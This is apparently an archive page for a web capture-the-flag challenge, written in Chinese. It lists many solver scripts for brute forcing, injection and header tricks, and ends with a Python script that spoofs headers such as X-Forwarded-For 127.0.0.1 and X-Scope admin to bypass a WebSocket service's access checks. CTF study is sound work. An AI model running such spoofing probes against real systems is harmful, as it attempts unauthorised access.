# 知识点

Challenges

# 题目分析

分类：Web / Challenges。

本页按现有附件、脚本和分析记录归档；运行与解题状态见具体记录，整理过程未执行题目或远端脚本。

## 文件

- [auth.py](auth.py)
- [authvar.py](authvar.py)
- [basic.py](basic.py)
- [block.py](block.py)
- [brute.py](brute.py)
- [brute2.py](brute2.py)
- [cert.py](cert.py)
- [closeoracle.py](closeoracle.py)
- [cmds.py](cmds.py)
- [counts.py](counts.py)
- [cred.py](cred.py)
- [defl.py](defl.py)
- [docs.html](docs.html)
- [feed.py](feed.py)
- [feedbrute.py](feedbrute.py)
- [fwd.py](fwd.py)
- [gwcreds.py](gwcreds.py)
- [gwparam.py](gwparam.py)
- [gwpaths.py](gwpaths.py)
- [hdr.py](hdr.py)
- [hdrbrute.py](hdrbrute.py)
- [hosthdr.py](hosthdr.py)
- [hosts.py](hosts.py)
- [httpup.py](httpup.py)
- [ident.py](ident.py)
- [idle.py](idle.py)
- [inject.py](inject.py)
- [ip.py](ip.py)
- [jsonsub.py](jsonsub.py)
- [lines.py](lines.py)
- [long.py](long.py)
- [long2.py](long2.py)
- [longfeed.py](longfeed.py)
- [maint.py](maint.py)
- [multi.py](multi.py)
- [oneframe.py](oneframe.py)
- [onewrite.py](onewrite.py)
- [paths.py](paths.py)
- [pingtest.py](pingtest.py)
- [portuser.py](portuser.py)
- [probe.py](probe.py)
- [probe2.py](probe2.py)
- [proto.py](proto.py)
- [qbrute.py](qbrute.py)
- [qbrute2.py](qbrute2.py)
- [qs.py](qs.py)
- [qs2.py](qs2.py)
- [rawf.py](rawf.py)
- [rawline.py](rawline.py)
- [rawmode.py](rawmode.py)
- [relayfuzz.py](relayfuzz.py)
- [scan.py](scan.py)
- [scan2.py](scan2.py)
- [scan3.py](scan3.py)
- [seq.py](seq.py)
- [sig2.py](sig2.py)
- [sigbrute.py](sigbrute.py)
- [sub.py](sub.py)
- [subonly.py](subonly.py)
- [third.py](third.py)
- [tok.py](tok.py)
- [toklines.py](toklines.py)
- [unmask_cmd.py](unmask_cmd.py)
- [unmasked.py](unmasked.py)
- [vals.py](vals.py)
- [ws.py](ws.py)
- [wspath.py](wspath.py)
- [zeromask.py](zeromask.py)

尚无可匹配的题解正文，当前保留附件及已有脚本，分析结论待补。

# EXP

- [auth.py](auth.py)
- [authvar.py](authvar.py)
- [basic.py](basic.py)
- [block.py](block.py)
- [brute.py](brute.py)
- [brute2.py](brute2.py)
- [cert.py](cert.py)
- [closeoracle.py](closeoracle.py)
- [cmds.py](cmds.py)
- [counts.py](counts.py)
- [cred.py](cred.py)
- [defl.py](defl.py)
- [feed.py](feed.py)
- [feedbrute.py](feedbrute.py)
- [fwd.py](fwd.py)
- [gwcreds.py](gwcreds.py)
- [gwparam.py](gwparam.py)
- [gwpaths.py](gwpaths.py)
- [hdr.py](hdr.py)
- [hdrbrute.py](hdrbrute.py)
- [hosthdr.py](hosthdr.py)
- [hosts.py](hosts.py)
- [httpup.py](httpup.py)
- [ident.py](ident.py)
- [idle.py](idle.py)
- [inject.py](inject.py)
- [ip.py](ip.py)
- [jsonsub.py](jsonsub.py)
- [lines.py](lines.py)
- [long.py](long.py)
- [long2.py](long2.py)
- [longfeed.py](longfeed.py)
- [maint.py](maint.py)
- [multi.py](multi.py)
- [oneframe.py](oneframe.py)
- [onewrite.py](onewrite.py)
- [paths.py](paths.py)
- [pingtest.py](pingtest.py)
- [portuser.py](portuser.py)
- [probe.py](probe.py)
- [probe2.py](probe2.py)
- [proto.py](proto.py)
- [qbrute.py](qbrute.py)
- [qbrute2.py](qbrute2.py)
- [qs.py](qs.py)
- [qs2.py](qs2.py)
- [rawf.py](rawf.py)
- [rawline.py](rawline.py)
- [rawmode.py](rawmode.py)
- [relayfuzz.py](relayfuzz.py)
- [scan.py](scan.py)
- [scan2.py](scan2.py)
- [scan3.py](scan3.py)
- [seq.py](seq.py)
- [sig2.py](sig2.py)
- [sigbrute.py](sigbrute.py)
- [sub.py](sub.py)
- [subonly.py](subonly.py)
- [third.py](third.py)
- [tok.py](tok.py)
- [toklines.py](toklines.py)
- [unmask_cmd.py](unmask_cmd.py)
- [unmasked.py](unmasked.py)
- [vals.py](vals.py)
- [ws.py](ws.py)
- [wspath.py](wspath.py)
- [zeromask.py](zeromask.py)

脚本按已有材料保留，使用前核对目标程序、运行库和参数。公开副本中的历史服务地址已替换，需自行设置。

```python
import time, select
from ws import connect, recv_frame
cases=[("X-Forwarded-For","127.0.0.1"),("X-Forwarded-For","127.0.0.1, 127.0.0.1"),
("X-Real-IP","127.0.0.1"),("Forwarded","for=127.0.0.1"),("X-Client-IP","127.0.0.1"),
("X-Originating-IP","127.0.0.1"),("True-Client-IP","127.0.0.1"),("CF-Connecting-IP","127.0.0.1"),
("X-Forwarded-Host","relay.internal"),("X-Forwarded-Server","relay"),("X-Host","relay"),
("X-Forwarded-Proto","internal"),("X-Env","production"),("X-Namespace","internal"),
("X-Scope","admin"),("X-Scope","ops"),("X-Permissions","admin"),("X-Permission","admin"),
("X-Groups","ops"),("X-Group","ops"),("X-Team","ops"),("X-Department","ops")]
for k,v in cases:
    try:
        s,resp=connect(extra_headers={k:v}); s.setblocking(False)
        out=[]; end=time.time()+0.8
        while time.time()<end:
            r,_,_=select.select([s],[],[],0.1)
            if r:
                try: out.append(recv_frame(s)[1])
                except Exception: out.append(b"EOF"); break
        s.close()
        rdy=[x for x in out if isinstance(x,bytes) and x.startswith(b"READY")]
        print(f"{k}: {v:24s}", rdy if rdy else out)
    except Exception as e: print(k,"EXC",str(e)[:40])
```
